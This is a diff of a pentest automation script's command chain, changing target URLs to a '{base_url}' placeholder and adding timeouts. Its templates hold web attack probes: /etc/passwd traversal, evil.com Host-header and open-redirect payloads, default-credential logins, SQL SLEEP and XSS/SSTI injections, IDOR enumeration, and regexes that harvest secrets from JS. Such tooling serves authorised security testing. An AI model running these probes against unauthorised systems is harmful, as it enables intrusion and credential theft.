@@ -151,8 +151,8 @@ CHAIN = [
             {
                 "id": "recon_web", "label": "HTTP/S Fingerprint", "tool": "curl / whatweb",
                 "description": "Banner grab, redirect chain, server headers, X-Powered-By, CSP, CORS, cookie flags, WAF detection, technology stack.",
-                "cmd_template": "curl -sIL --max-time 8 http://{target} 2>&1; echo '=HTTPS='; curl -skIL --max-time 8 https://{target} 2>&1; curl -skI --max-time 8 http://{target}:8080 2>&1; curl -skI --max-time 8 https://{target}:8443 2>&1; echo '=DISCOVERED PORTS='; for p in $(echo \"{ports}\" | tr ',' '\\n' | grep -vE '^(80|443|8080|8443)$' | head -8); do [ -z \"$p\" ] && continue; echo \"--- HTTP on :$p ---\"; curl -skI --max-time 3 \"http://{target}:$p\" 2>&1 | head -8; done; echo '=WHATWEB='; timeout -k 5 60 whatweb -a 1 http://{target} 2>&1 | head -20; echo '=WAF='; timeout -k 5 45 wafw00f http://{target} 2>&1 | head -15",
-                "fallback_cmd": "curl -sIL --max-time 8 http://{target} 2>&1; curl -skIL --max-time 8 https://{target} 2>&1",
+                "cmd_template": "curl -sIL --max-time 8 {base_url} 2>&1; echo '=HTTPS='; curl -skIL --max-time 8 https://{base_host} 2>&1; curl -skI --max-time 8 http://{target}:8080 2>&1; curl -skI --max-time 8 https://{target}:8443 2>&1; echo '=DISCOVERED PORTS='; for p in $(echo \"{ports}\" | tr ',' '\\n' | grep -vE '^(80|443|8080|8443)$' | head -8); do [ -z \"$p\" ] && continue; echo \"--- HTTP on :$p ---\"; curl -skI --max-time 3 \"http://{target}:$p\" 2>&1 | head -8; done; echo '=WHATWEB='; timeout -k 5 60 whatweb -a 1 {base_url} 2>&1 | head -20; echo '=WAF='; timeout -k 5 45 wafw00f {base_url} 2>&1 | head -15",
+                "fallback_cmd": "curl -sIL --max-time 8 {base_url} 2>&1; curl -skIL --max-time 8 https://{base_host} 2>&1",
                 "parse": "headers",
             },
             {
@@ -172,8 +172,8 @@ CHAIN = [
             {
                 "id": "recon_waf_cdn", "label": "WAF / CDN / Load Balancer Detection", "tool": "wafw00f / nmap",
                 "description": "Detect Web Application Firewalls, CDN providers, load balancers and cloud platform indicators.",
-                "cmd_template": "timeout -k 5 45 wafw00f -a http://{target} 2>&1; timeout -k 5 45 wafw00f -a https://{target} 2>&1; echo '---NMAP WAF NSE---'; timeout -k 5 60 nmap --script=http-waf-detect,http-waf-fingerprint -p 80,443 {target} 2>&1 | head -30; echo '---CLOUDFLARE CHECK---'; curl -skI --max-time 8 https://{target} 2>&1 | grep -iE 'cf-ray|x-cdn|via|x-cache|x-amz|x-azure|server' | head -10",
-                "fallback_cmd": "curl -skI --max-time 8 http://{target} 2>&1 | grep -iE 'server|via|x-powered|x-cache'",
+                "cmd_template": "timeout -k 5 45 wafw00f -a {base_url} 2>&1; timeout -k 5 45 wafw00f -a https://{base_host} 2>&1; echo '---NMAP WAF NSE---'; timeout -k 5 60 nmap --script=http-waf-detect,http-waf-fingerprint -p 80,443 {target} 2>&1 | head -30; echo '---CLOUDFLARE CHECK---'; curl -skI --max-time 8 https://{base_host} 2>&1 | grep -iE 'cf-ray|x-cdn|via|x-cache|x-amz|x-azure|server' | head -10",
+                "fallback_cmd": "curl -skI --max-time 8 {base_url} 2>&1 | grep -iE 'server|via|x-powered|x-cache'",
                 "parse": "waf",
             },
             {
@@ -207,7 +207,7 @@ CHAIN = [
             {
                 "id": "recon_js_leak", "label": "JS / Endpoint Leakage", "tool": "python / curl",
                 "description": "Crawls script references on the app, downloads each JS bundle, and extracts API endpoints. Emits a high finding ONLY when a real secret pattern (AWS/stripe/GitHub/GCP/slack/JWT/private key/password) is present in bundle content.",
-                "cmd_template": "python3 - <<'PY'\nimport urllib.request,re\nhtml=''\nfor page in ('/', '/spa'):\n    try:\n        html+=urllib.request.urlopen('http://{target}'+page,timeout=8).read().decode('utf-8','ignore')\n    except Exception:\n        pass\nscripts=re.findall(r'''<script[^>]+src=[\"']([^\"']+)[\"']''',html)\nscripts=[s for s in scripts if s.endswith('.js')][:12]\njs=''\nfor s in scripts:\n    u2=s if s.startswith('http') else ('http://{target}'+s if s.startswith('/') else 'http://{target}/'+s)\n    try:\n        js+=urllib.request.urlopen(u2,timeout=6).read().decode('utf-8','ignore')+'\\n'\n    except Exception:\n        pass\nprint('=====JS-SRC-LIST=====')\nfor s in scripts: print(s)\nprint('=====JS-ENDPOINTS=====')\npat=r'''[\"']((?:/|https?://)[A-Za-z0-9_\\-\\./]*(?:/api/|/v1/|/v2/|/graphql|/rest|/wp-json|/upload|/download|/assets)[A-Za-z0-9_\\-\\./]*)[\"']'''\nfor m in sorted(set(re.findall(pat,js)))[:40]: print(m)\nprint('=====JS-SECRETS=====')\npats=[(r'sk_[A-Za-z0-9_]{20,}','stripe'),(r'AKIA[0-9A-Z]{16}','aws'),(r'ghp_[A-Za-z0-9]{30,}','github'),(r'AIza[0-9A-Za-z_-]{30,}','gcp'),(r'xox[baprs]-[A-Za-z0-9-]{10,}','slack'),(r'(eyJ[A-Za-z0-9_-]{10,}\\.[A-Za-z0-9_-]{10,}\\.)[A-Za-z0-9_-]{10,}','jwt'),(r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----','private_key'),(r'password\\?\\s*[:=]\\s*[\"\\']([^\"\\']{6,})[\"\\']','password')]\nfor pat,name in pats:\n    for m in list(set(re.findall(pat,js)))[:5]:\n        v=m if isinstance(m,str) else (m[-1] if m[-1] else m[0])\n        print('SECRET:'+name+':'+(v[:70] if v else ''))\nprint('=====SOURCEMAP=====')\nfor s in scripts[:8]:\n    u2=s if s.startswith('http') else ('http://{target}'+s if s.startswith('/') else 'http://{target}/'+s)\n    try:\n        b=urllib.request.urlopen(u2+'.map',timeout=6).read()\n        if b[:1]==b'{': print('MAP:'+u2+'.map')\n    except Exception:\n        pass\nPY",
+                "cmd_template": "python3 - <<'PY'\nimport urllib.request,re\nhtml=''\nfor page in ('/', '/spa'):\n    try:\n        html+=urllib.request.urlopen('{base_url}'+page,timeout=8).read().decode('utf-8','ignore')\n    except Exception:\n        pass\nscripts=re.findall(r'''<script[^>]+src=[\"']([^\"']+)[\"']''',html)\nscripts=[s for s in scripts if s.endswith('.js')][:12]\njs=''\nfor s in scripts:\n    u2=s if s.startswith('http') else ('{base_url}'+s if s.startswith('/') else '{base_url}/'+s)\n    try:\n        js+=urllib.request.urlopen(u2,timeout=6).read().decode('utf-8','ignore')+'\\n'\n    except Exception:\n        pass\nprint('=====JS-SRC-LIST=====')\nfor s in scripts: print(s)\nprint('=====JS-ENDPOINTS=====')\npat=r'''[\"']((?:/|https?://)[A-Za-z0-9_\\-\\./]*(?:/api/|/v1/|/v2/|/graphql|/rest|/wp-json|/upload|/download|/assets)[A-Za-z0-9_\\-\\./]*)[\"']'''\nfor m in sorted(set(re.findall(pat,js)))[:40]: print(m)\nprint('=====JS-SECRETS=====')\npats=[(r'sk_[A-Za-z0-9_]{20,}','stripe'),(r'AKIA[0-9A-Z]{16}','aws'),(r'ghp_[A-Za-z0-9]{30,}','github'),(r'AIza[0-9A-Za-z_-]{30,}','gcp'),(r'xox[baprs]-[A-Za-z0-9-]{10,}','slack'),(r'(eyJ[A-Za-z0-9_-]{10,}\\.[A-Za-z0-9_-]{10,}\\.)[A-Za-z0-9_-]{10,}','jwt'),(r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----','private_key'),(r'password\\?\\s*[:=]\\s*[\"\\']([^\"\\']{6,})[\"\\']','password')]\nfor pat,name in pats:\n    for m in list(set(re.findall(pat,js)))[:5]:\n        v=m if isinstance(m,str) else (m[-1] if m[-1] else m[0])\n        print('SECRET:'+name+':'+(v[:70] if v else ''))\nprint('=====SOURCEMAP=====')\nfor s in scripts[:8]:\n    u2=s if s.startswith('http') else ('{base_url}'+s if s.startswith('/') else '{base_url}/'+s)\n    try:\n        b=urllib.request.urlopen(u2+'.map',timeout=6).read()\n        if b[:1]==b'{': print('MAP:'+u2+'.map')\n    except Exception:\n        pass\nPY",
                 "fallback_cmd": "echo 'JS_SCAN_ERROR: no python3 urllib available'",
                 "parse": "js_leak",
             },
@@ -228,7 +228,7 @@ CHAIN = [
             {
                 "id": "recon_nuclei", "label": "Nuclei Exposure & Misconfig Recon", "tool": "nuclei",
                 "description": "Scan against exposures, misconfiguration, exposed-panels and token-spray templates only — recon-grade detection feeding later verification.",
-                "cmd_template": "if command -v nuclei >/dev/null 2>&1 && [ -d {nuclei_dir}/http ]; then timeout -k 5 180 nuclei -u http://{target} -t {nuclei_dir}/http/exposures -t {nuclei_dir}/http/misconfiguration -t {nuclei_dir}/http/exposed-panels -t {nuclei_dir}/http/token-spray -severity critical,high,medium -silent -duc -o {outdir}/nuclei_recon.txt 2>&1 | head -80; else echo '[nuclei or templates not installed]'; fi",
+                "cmd_template": "if command -v nuclei >/dev/null 2>&1 && [ -d {nuclei_dir}/http ]; then timeout -k 5 180 nuclei -u {base_url} -t {nuclei_dir}/http/exposures -t {nuclei_dir}/http/misconfiguration -t {nuclei_dir}/http/exposed-panels -t {nuclei_dir}/http/token-spray -severity critical,high,medium -silent -duc -o {outdir}/nuclei_recon.txt 2>&1 | head -80; else echo '[nuclei or templates not installed]'; fi",
                 "fallback_cmd": "echo '[nuclei not installed]'",
                 "parse": "nuclei",
             },
@@ -249,8 +249,8 @@ CHAIN = [
             {
                 "id": "recon_cloud", "label": "Cloud / CDN Misconfig Baseline", "tool": "curl / python",
                 "description": "Provider and CDN header fingerprinting plus cloud well-known endpoint checks. Emits informational provider findings from real header evidence only.",
-                "cmd_template": "echo '=PROVIDER HEADERS (HTTP)='; curl -skI --max-time 8 http://{target} 2>&1 | grep -iE 'server|x-amz-|x-azure-|x-gcs-|x-goog-|via|x-sucuri|x-cld-|cf-ray|x-host' | head -12; echo '=PROVIDER HEADERS (HTTPS)='; curl -skI --max-time 8 https://{target} 2>&1 | grep -iE 'server|x-amz-|x-azure-|x-gcs-|x-cf-|via|cf-ray' | head -8; echo '=CLOUD WELL-KNOWN='; for u in .well-known/openid-configuration .well-known/security.txt robots.txt; do code=$(curl -sk -o /dev/null -w '%{http_code}' --max-time 4 'http://{target}/'$u); echo \"$u -> $code\"; done",
-                "fallback_cmd": "curl -skI --max-time 8 http://{target} 2>&1 | grep -iE 'server|x-amz-|cf-ray|via' | head -8",
+                "cmd_template": "echo '=PROVIDER HEADERS (HTTP)='; curl -skI --max-time 8 {base_url} 2>&1 | grep -iE 'server|x-amz-|x-azure-|x-gcs-|x-goog-|via|x-sucuri|x-cld-|cf-ray|x-host' | head -12; echo '=PROVIDER HEADERS (HTTPS)='; curl -skI --max-time 8 https://{base_host} 2>&1 | grep -iE 'server|x-amz-|x-azure-|x-gcs-|x-cf-|via|cf-ray' | head -8; echo '=CLOUD WELL-KNOWN='; for u in .well-known/openid-configuration .well-known/security.txt robots.txt; do code=$(curl -sk -o /dev/null -w '%{http_code}' --max-time 4 '{base_url}/'$u); echo \"$u -> $code\"; done",
+                "fallback_cmd": "curl -skI --max-time 8 {base_url} 2>&1 | grep -iE 'server|x-amz-|cf-ray|via' | head -8",
                 "parse": "cloud",
             },
         ],
@@ -269,7 +269,7 @@ CHAIN = [
             {
                 "id": "vuln_nuclei", "label": "Nuclei Template Scan", "tool": "nuclei",
                 "description": "Fast template-based vulnerability scanner covering CVEs, misconfigs, exposures, default-logins and takeovers.",
-                "cmd_template": "nuclei -u http://{target} -severity critical,high,medium -t {nuclei_dir}/http/cves -t {nuclei_dir}/http/vulnerabilities -t {nuclei_dir}/http/misconfiguration -t {nuclei_dir}/http/exposures -t {nuclei_dir}/http/default-logins -t {nuclei_dir}/http/takeovers -o {outdir}/nuclei.txt -rate-limit 50 -duc 2>&1 | head -80",
+                "cmd_template": "nuclei -u {base_url} -severity critical,high,medium -t {nuclei_dir}/http/cves -t {nuclei_dir}/http/vulnerabilities -t {nuclei_dir}/http/misconfiguration -t {nuclei_dir}/http/exposures -t {nuclei_dir}/http/default-logins -t {nuclei_dir}/http/takeovers -o {outdir}/nuclei.txt -rate-limit 50 -duc 2>&1 | head -80",
                 "fallback_cmd": "echo '[nuclei not installed] Install: go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest'",
                 "parse": "nuclei",
             },
@@ -282,8 +282,8 @@ CHAIN = [
             {
                 "id": "vuln_web_dirs", "label": "Web Directory & File Brute", "tool": "gobuster / ffuf",
                 "description": "Enumerate hidden directories, admin panels, config files, backup files, API paths.",
-                "cmd_template": "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -t 60 -q --no-error -x php,asp,aspx,jsp,txt,bak,conf,xml,json,sql,log,zip,tar.gz -o {outdir}/gobuster.txt 2>&1 | head -80; echo '---FFUF FUZZ---'; ffuf -u http://{target}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,201,301,302,401,403 -t 50 -o {outdir}/ffuf.json 2>&1 | grep -v INFO | head -40",
-                "fallback_cmd": "dirb http://{target} /usr/share/wordlists/dirb/common.txt -S 2>&1 | head -80",
+                "cmd_template": "gobuster dir -u {base_url} -w /usr/share/wordlists/dirb/common.txt -t 60 -q --no-error -x php,asp,aspx,jsp,txt,bak,conf,xml,json,sql,log,zip,tar.gz -o {outdir}/gobuster.txt 2>&1 | head -80; echo '---FFUF FUZZ---'; ffuf -u {base_url}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,201,301,302,401,403 -t 50 -o {outdir}/ffuf.json 2>&1 | grep -v INFO | head -40",
+                "fallback_cmd": "dirb {base_url} /usr/share/wordlists/dirb/common.txt -S 2>&1 | head -80",
                 "parse": "dirb",
             },
             {
@@ -344,19 +344,19 @@ CHAIN = [
             {
                 "id": "deep_http_anomaly", "label": "HTTP Behaviour Anomaly", "tool": "curl probes",
                 "description": "Path traversal, verb tampering, host header injection, sensitive file exposure.",
-                "cmd_template": "echo '---TRAVERSAL---'; curl -sk --max-time 8 'http://{target}/../../../../etc/passwd' -o - 2>&1 | head -5; echo '---VERB TAMPER---'; curl -skI -X TRACE 'http://{target}/' 2>&1 | head -10; echo '---HOST INJECT---'; curl -skI -H 'Host: evil.com' 'http://{target}/' 2>&1 | head -8; echo '---OPTIONS---'; curl -skI -X OPTIONS 'http://{target}/' 2>&1 | head -8; echo '---ADMIN---'; body=$(curl -skL --max-time 8 -r 0-199 'http://{target}/admin' 2>/dev/null | tr '\\n' ' '); code=$(curl -skL --max-time 8 -o /dev/null -w '%{http_code}' 'http://{target}/admin' 2>/dev/null); echo \"body:admin[$code] $body\"; echo '---GIT---'; body=$(curl -skL --max-time 8 -r 0-199 'http://{target}/.git/config' 2>/dev/null | tr '\\n' ' '); code=$(curl -skL --max-time 8 -o /dev/null -w '%{http_code}' 'http://{target}/.git/config' 2>/dev/null); echo \"body:.git[$code] $body\"; echo '---ENV---'; body=$(curl -skL --max-time 8 -r 0-199 'http://{target}/.env' 2>/dev/null | tr '\\n' ' '); code=$(curl -skL --max-time 8 -o /dev/null -w '%{http_code}' 'http://{target}/.env' 2>/dev/null); echo \"body:.env[$code] $body\"",
+                "cmd_template": "echo '---TRAVERSAL---'; curl -sk --max-time 8 '{base_url}/../../../../etc/passwd' -o - 2>&1 | head -5; echo '---VERB TAMPER---'; curl --max-time 12 -skI -X TRACE '{base_url}/' 2>&1 | head -10; echo '---HOST INJECT---'; curl --max-time 12 -skI -H 'Host: evil.com' '{base_url}/' 2>&1 | head -8; echo '---OPTIONS---'; curl --max-time 12 -skI -X OPTIONS '{base_url}/' 2>&1 | head -8; echo '---ADMIN---'; body=$(curl -skL --max-time 8 -r 0-199 '{base_url}/admin' 2>/dev/null | tr '\\n' ' '); code=$(curl -skL --max-time 8 -o /dev/null -w '%{http_code}' '{base_url}/admin' 2>/dev/null); echo \"body:admin[$code] $body\"; echo '---GIT---'; body=$(curl -skL --max-time 8 -r 0-199 '{base_url}/.git/config' 2>/dev/null | tr '\\n' ' '); code=$(curl -skL --max-time 8 -o /dev/null -w '%{http_code}' '{base_url}/.git/config' 2>/dev/null); echo \"body:.git[$code] $body\"; echo '---ENV---'; body=$(curl -skL --max-time 8 -r 0-199 '{base_url}/.env' 2>/dev/null | tr '\\n' ' '); code=$(curl -skL --max-time 8 -o /dev/null -w '%{http_code}' '{base_url}/.env' 2>/dev/null); echo \"body:.env[$code] $body\"",
                 "parse": "http_anomaly",
             },
             {
                 "id": "deep_timing", "label": "Timing / Side-Channel Probe", "tool": "curl timing",
                 "description": "Response time variance for blind SQLi, auth oracle, and timing-based info leaks.",
-                "cmd_template": "for i in 1 2 3 4 5; do curl -sk -o /dev/null -w \"t=%{time_total} code=%{http_code}\\n\" 'http://{target}/' 2>&1; done; echo '---LOGIN TIMING---'; curl -sk -o /dev/null -w \"valid_user=%{time_total}\\n\" -X POST 'http://{target}/login' -d 'user=admin&pass=wrong' 2>&1; curl -sk -o /dev/null -w \"invalid_user=%{time_total}\\n\" -X POST 'http://{target}/login' -d 'user=zzzinvalid999&pass=wrong' 2>&1; echo '---SQLI SLEEP---'; curl -sk -o /dev/null -w \"sqli_probe=%{time_total}\\n\" 'http://{target}/?id=1+AND+SLEEP(3)' 2>&1; curl -sk -o /dev/null -w \"sqli_baseline=%{time_total}\\n\" 'http://{target}/?id=1' 2>&1",
+                "cmd_template": "for i in 1 2 3 4 5; do curl --max-time 12 -sk -o /dev/null -w \"t=%{time_total} code=%{http_code}\\n\" '{base_url}/' 2>&1; done; echo '---LOGIN TIMING---'; curl --max-time 12 -sk -o /dev/null -w \"valid_user=%{time_total}\\n\" -X POST '{base_url}/login' -d 'user=admin&pass=wrong' 2>&1; curl --max-time 12 -sk -o /dev/null -w \"invalid_user=%{time_total}\\n\" -X POST '{base_url}/login' -d 'user=zzzinvalid999&pass=wrong' 2>&1; echo '---SQLI SLEEP---'; curl --max-time 20 -sk -o /dev/null -w \"sqli_probe=%{time_total}\\n\" '{base_url}/?id=1+AND+SLEEP(3)' 2>&1; curl --max-time 12 -sk -o /dev/null -w \"sqli_baseline=%{time_total}\\n\" '{base_url}/?id=1' 2>&1",
                 "parse": "timing",
             },
             {
                 "id": "deep_auth_probe", "label": "Auth & Session Weaknesses", "tool": "curl probes",
                 "description": "Session fixation, token flags, default credentials on SSH/FTP/HTTP.",
-                "cmd_template": "echo '---SESSION HEADERS---'; curl -skI --max-time 8 'http://{target}/login' 2>&1 | grep -iE 'set-cookie|www-auth|x-frame|x-xss|strict-transport|content-security' | head -15; echo '---BASIC AUTH PROBE---'; anon=$(curl -sk --max-time 8 -o /dev/null -w '%{http_code}' 'http://{target}/' 2>/dev/null); echo \"anon=$anon\"; curl -sku admin:admin --max-time 8 -o /dev/null -w 'admin:admin=%{http_code}\\n' 'http://{target}/' 2>&1; curl -sku admin:password --max-time 8 -o /dev/null -w 'admin:password=%{http_code}\\n' 'http://{target}/' 2>&1; curl -sku root:root --max-time 8 -o /dev/null -w 'root:root=%{http_code}\\n' 'http://{target}/' 2>&1; echo '---FTP ANON---'; curl -s --max-time 8 ftp://{target}/ 2>&1 | head -10; echo '---SSH VERSION---'; nc -w 4 {target} 22 2>&1 | head -3",
+                "cmd_template": "echo '---SESSION HEADERS---'; curl --max-time 8 -sk -D - -o /dev/null '{base_url}/login' 2>&1 | grep -iE 'set-cookie|www-auth|x-frame|x-xss|strict-transport|content-security' | head -15; echo '---BASIC AUTH PROBE---'; anon=$(curl -sk --max-time 8 -o /dev/null -w '%{http_code}' '{base_url}/' 2>/dev/null); echo \"anon=$anon\"; curl -sku admin:admin --max-time 8 -o /dev/null -w 'admin:admin=%{http_code}\\n' '{base_url}/' 2>&1; curl -sku admin:password --max-time 8 -o /dev/null -w 'admin:password=%{http_code}\\n' '{base_url}/' 2>&1; curl -sku root:root --max-time 8 -o /dev/null -w 'root:root=%{http_code}\\n' '{base_url}/' 2>&1; echo '---FTP ANON---'; curl -sv --max-time 8 ftp://{target}/ 2>&1 | head -30; echo '---SSH VERSION---'; nc -w 4 {target} 22 2>&1 | head -3",
                 "parse": "auth_probe",
             },
             {
@@ -367,15 +367,15 @@ CHAIN = [
             },{
                 "id": "deep_xss_probe", "label": "XSS & Injection Surface Probe", "tool": "dalfox / curl",
                 "description": "Reflected XSS, open redirect, XXE, SSTI and DOM injection probes across common parameters.",
-                "cmd_template": "echo '---XSS REFLECT---'; for p in q search id name input; do code=$(curl -skL -o /dev/null -w '%{http_code}' http://{target}/?$p=%3Cscript%3Ealert%281%29%3C%2Fscript%3E 2>/dev/null); body=$(curl -skL http://{target}/?$p=%3Cscript%3Ealert%281%29%3C%2Fscript%3E 2>/dev/null | grep -oiF '<script>alert(1)</script>' | head -1); echo $p' XSS '${code}': '$body; done; echo '---OPEN REDIRECT---'; for p in next redirect url return dest; do r=$(curl -skI http://{target}/?$p=https://evil.com 2>/dev/null | grep -i 'location.*evil' | head -1); echo $p': '$r; done; echo '---XXE PROBE---'; curl -sk -X POST -H 'Content-Type: application/xml' --data-binary '<root></root>' http://{target}/ -o - 2>&1 | grep -iE 'root:|xxe|entity' | head -3; echo '---SSTI PROBE---'; curl -sk http://{target}/?name=%7B%7B7*7%7D%7D -o - 2>&1 | grep -o '49' | head -2; echo '---DALFOX---'; if command -v dalfox >/dev/null 2>&1; then dalfox url http://{target}/ --silence --no-spinner 2>&1 | head -20; else echo '[dalfox not installed — skipped]'; fi",
-                "fallback_cmd": "echo '---XSS CHECK---'; for p in q search id; do curl -sk http://{target}/?$p=%3Cscript%3Ealert%281%29%3C%2Fscript%3E -o - 2>&1 | grep -oiF '<script>alert(1)</script>' | head -1; done",
+                "cmd_template": "echo '---XSS REFLECT---'; for p in q search id name input; do code=$(curl --max-time 12 -skL -o /dev/null -w '%{http_code}' {base_url}/?$p=%3Cscript%3Ealert%281%29%3C%2Fscript%3E 2>/dev/null); body=$(curl --max-time 12 -skL {base_url}/?$p=%3Cscript%3Ealert%281%29%3C%2Fscript%3E 2>/dev/null | grep -oiF '<script>alert(1)</script>' | head -1); echo $p' XSS '${code}': '$body; done; echo '---OPEN REDIRECT---'; for p in next redirect url return dest; do r=$(curl --max-time 12 -skI {base_url}/?$p=https://evil.com 2>/dev/null | grep -i 'location.*evil' | head -1); echo $p': '$r; done; echo '---XXE PROBE---'; curl --max-time 12 -sk -X POST -H 'Content-Type: application/xml' --data-binary '<root></root>' {base_url}/ -o - 2>&1 | grep -iE 'root:|xxe|entity' | head -3; echo '---SSTI PROBE---'; curl --max-time 12 -sk {base_url}/?name=%7B%7B7*7%7D%7D -o - 2>&1 | grep -o '49' | head -2; echo '---DALFOX---'; if command -v dalfox >/dev/null 2>&1; then dalfox url {base_url}/ --silence --no-spinner 2>&1 | head -20; else echo '[dalfox not installed — skipped]'; fi",
+                "fallback_cmd": "echo '---XSS CHECK---'; for p in q search id; do curl --max-time 12 -sk {base_url}/?$p=%3Cscript%3Ealert%281%29%3C%2Fscript%3E -o - 2>&1 | grep -oiF '<script>alert(1)</script>' | head -1; done",
                 "parse": "xss_probe",
             },
             {
                 "id": "deep_cms_scan", "label": "CMS & Framework Detection", "tool": "wpscan / droopescan",
                 "description": "Detect WordPress, Drupal, Joomla, Laravel, Django, Rails installs. Enumerate plugins, themes, users.",
-                "cmd_template": "echo '---WP DETECT---'; wb=$(curl -sk --max-time 8 'http://{target}/wp-login.php' 2>/dev/null | tr '\\n' ' ' | head -c 200); wc=$(curl -sk --max-time 8 -o /dev/null -w '%{http_code}' 'http://{target}/wp-login.php' 2>/dev/null); echo \"wp-login:$wc|$wb\"; curl -sk --max-time 8 'http://{target}/wp-json/wp/v2/users' -o - 2>&1 | head -5; echo '---WPSCAN---'; wpscan --url http://{target} --enumerate vp,u,m --no-update 2>&1 | head -60; echo '---DRUPAL---'; curl -sk --max-time 8 'http://{target}/CHANGELOG.txt' -o - 2>&1 | head -5; db=$(curl -sk --max-time 8 'http://{target}/user/login' 2>/dev/null | tr '\\n' ' ' | head -c 200); dc=$(curl -sk --max-time 8 -o /dev/null -w '%{http_code}' 'http://{target}/user/login' 2>/dev/null); echo \"drupal_login:$dc|$db\"; echo '---JOOMLA---'; jb=$(curl -sk --max-time 8 'http://{target}/administrator/' 2>/dev/null | tr '\\n' ' ' | head -c 200); jc=$(curl -sk --max-time 8 -o /dev/null -w '%{http_code}' 'http://{target}/administrator/' 2>/dev/null); echo \"joomla_admin:$jc|$jb\"",
-                "fallback_cmd": "wb=$(curl -sk --max-time 8 'http://{target}/wp-login.php' 2>/dev/null | tr '\\n' ' ' | head -c 200); wc=$(curl -sk --max-time 8 -o /dev/null -w '%{http_code}' 'http://{target}/wp-login.php' 2>/dev/null); echo \"wp-login:$wc|$wb\"; curl -sk --max-time 8 'http://{target}/CHANGELOG.txt' -o - 2>&1 | head -5",
+                "cmd_template": "echo '---WP DETECT---'; wb=$(curl -sk --max-time 8 '{base_url}/wp-login.php' 2>/dev/null | tr '\\n' ' ' | head -c 200); wc=$(curl -sk --max-time 8 -o /dev/null -w '%{http_code}' '{base_url}/wp-login.php' 2>/dev/null); echo \"wp-login:$wc|$wb\"; curl -sk --max-time 8 '{base_url}/wp-json/wp/v2/users' -o - 2>&1 | head -5; echo '---WPSCAN---'; wpscan --url {base_url} --enumerate vp,u,m --no-update 2>&1 | head -60; echo '---DRUPAL---'; curl -sk --max-time 8 '{base_url}/CHANGELOG.txt' -o - 2>&1 | head -5; db=$(curl -sk --max-time 8 '{base_url}/user/login' 2>/dev/null | tr '\\n' ' ' | head -c 200); dc=$(curl -sk --max-time 8 -o /dev/null -w '%{http_code}' '{base_url}/user/login' 2>/dev/null); echo \"drupal_login:$dc|$db\"; echo '---JOOMLA---'; jb=$(curl -sk --max-time 8 '{base_url}/administrator/' 2>/dev/null | tr '\\n' ' ' | head -c 200); jc=$(curl -sk --max-time 8 -o /dev/null -w '%{http_code}' '{base_url}/administrator/' 2>/dev/null); echo \"joomla_admin:$jc|$jb\"",
+                "fallback_cmd": "wb=$(curl -sk --max-time 8 '{base_url}/wp-login.php' 2>/dev/null | tr '\\n' ' ' | head -c 200); wc=$(curl -sk --max-time 8 -o /dev/null -w '%{http_code}' '{base_url}/wp-login.php' 2>/dev/null); echo \"wp-login:$wc|$wb\"; curl -sk --max-time 8 '{base_url}/CHANGELOG.txt' -o - 2>&1 | head -5",
                 "parse": "cms_scan",
             },
         ],
@@ -387,43 +387,43 @@ CHAIN = [
             {
                 "id": "api_discovery", "label": "API Endpoint Discovery", "tool": "curl / gobuster",
                 "description": "Discover REST/GraphQL endpoints, API versioning, swagger/openapi docs, and common API paths.",
-                "cmd_template": "echo '---API PATHS---'; for p in /api /api/v1 /api/v2 /api/v3 /v1 /v2 /graphql /swagger /swagger-ui /swagger.json /openapi.json /api-docs /rest /ws /wsdl /.well-known /health /metrics /actuator /actuator/env /actuator/mappings; do out=$(curl -skL --max-time 8 -w '%{http_code}' -o /tmp/pwm_apid_$$ 'http://{target}'$p 2>/dev/null); body=$(tr '\\n' ' ' < /tmp/pwm_apid_$$ 2>/dev/null | head -c 180); rm -f /tmp/pwm_apid_$$; echo \"$p:$out|$body\"; done; echo '---GRAPHQL INTROSPECT---'; curl -sk --max-time 8 -X POST -H 'Content-Type: application/json' -d '{{\"query\":\"{{__schema{{types{{name}}}}}}\"}}' http://{target}/graphql 2>&1 | head -20",
+                "cmd_template": "echo '---API PATHS---'; for p in /api /api/v1 /api/v2 /api/v3 /v1 /v2 /graphql /swagger /swagger-ui /swagger.json /openapi.json /api-docs /rest /ws /wsdl /.well-known /health /metrics /actuator /actuator/env /actuator/mappings; do out=$(curl -skL --max-time 8 -w '%{http_code}' -o /tmp/pwm_apid_$$ '{base_url}'$p 2>/dev/null); body=$(tr '\\n' ' ' < /tmp/pwm_apid_$$ 2>/dev/null | head -c 180); rm -f /tmp/pwm_apid_$$; echo \"$p:$out|$body\"; done; echo '---GRAPHQL INTROSPECT---'; curl -sk --max-time 8 -X POST -H 'Content-Type: application/json' -d '{{\"query\":\"{{__schema{{types{{name}}}}}}\"}}' {base_url}/graphql 2>&1 | head -20",
                 "parse": "api_discovery",
             },
             {
                 "id": "api_bola", "label": "BOLA / IDOR Testing", "tool": "curl probes",
                 "description": "Broken Object Level Authorization — test ID enumeration across common API object endpoints.",
-                "cmd_template": "echo '---BOLA/IDOR PROBES---'; for id in 1 2 3 100 999 0 -1; do echo \"=== id=$id ===\"; curl -sk 'http://{target}/api/v1/users/'$id -o - 2>&1 | head -5; curl -sk 'http://{target}/api/users/'$id -o - 2>&1 | head -5; curl -sk 'http://{target}/api/v1/orders/'$id -o - 2>&1 | head -5; done; echo '---UUID PROBE---'; curl -sk 'http://{target}/api/v1/users/00000000-0000-0000-0000-000000000001' -o - 2>&1 | head -5",
+                "cmd_template": "echo '---BOLA/IDOR PROBES---'; for id in 1 2 3 100 999 0 -1; do echo \"=== id=$id ===\"; curl --max-time 12 -sk '{base_url}/api/v1/users/'$id -o - 2>&1 | head -5; curl --max-time 12 -sk '{base_url}/api/users/'$id -o - 2>&1 | head -5; curl --max-time 12 -sk '{base_url}/api/v1/orders/'$id -o - 2>&1 | head -5; done; echo '---UUID PROBE---'; curl --max-time 12 -sk '{base_url}/api/v1/users/00000000-0000-0000-0000-000000000001' -o - 2>&1 | head -5",
                 "parse": "api_bola",
             },
             {
                 "id": "api_auth", "label": "Broken Authentication Probe", "tool": "curl probes",
                 "description": "Test JWT weaknesses, missing auth on endpoints, token reuse, and brute-force protection.",
